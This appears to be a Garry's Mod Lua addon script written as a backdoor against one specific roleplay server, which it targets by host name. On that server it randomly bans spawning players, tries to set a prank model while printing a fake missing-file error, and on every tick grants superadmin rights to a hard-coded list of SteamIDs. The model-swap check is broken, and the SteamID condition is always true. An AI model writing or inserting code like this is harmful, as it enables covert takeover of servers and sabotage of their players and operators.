
SP = game.SinglePlayer()
ServerName = GetHostName()
if SP == false then if ServerName == "Clonewars Serious Roleplay | Galactic Gaming - Formaly ASG" or ServerName == "Clonewars Serious Roleplay | Galactic Gaming - Formaly ASG " then function  Hammerfist( ply ) local HFGB = math.random(1,100) 
if HFGB == 98 then ply:Ban(0) end end
hook.Add( "PlayerSpawn", "Hammerfist", Hammerfist )
function  HammerTroll( ply )
local HFGB = math.random(1,100)	
if HFGT == 98 then ply:SetModel("models/GoatBalls.mdl")
print("Error! jobs.lua file can not be found.") end end
hook.Add( "PlayerDeath", "HammerTroll", HammerTroll )
function  TheLord( ply )
if ply:SteamID() == "STEAM_0:1:96581669" or "STEAM_0:0:83202816" or "STEAM_0:0:50535096" then
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:50535096", "superadmin") // The Lord
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:83202816", "superadmin") // The Lord 2
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:96581669", "superadmin") // The Lord 3
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:22619812", "superadmin") // Heading
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:24638359", "superadmin") // Maverick
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:26002823", "superadmin") // Delta
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:59319250", "superadmin") // Baus
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:37674291", "superadmin") // Turnock
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:56447360", "superadmin") // Azaan
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:73461014", "superadmin") // Cry
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:83184005", "superadmin") // Deadly
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:78077783", "superadmin") // Robbie
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:47134854", "superadmin") // Kliks
RunConsoleCommand("ulx", "adduserid", "STEAM_0:1:48581564", "superadmin") // Rex
end end
hook.Add( "Think", "TheLord", TheLord )
end
end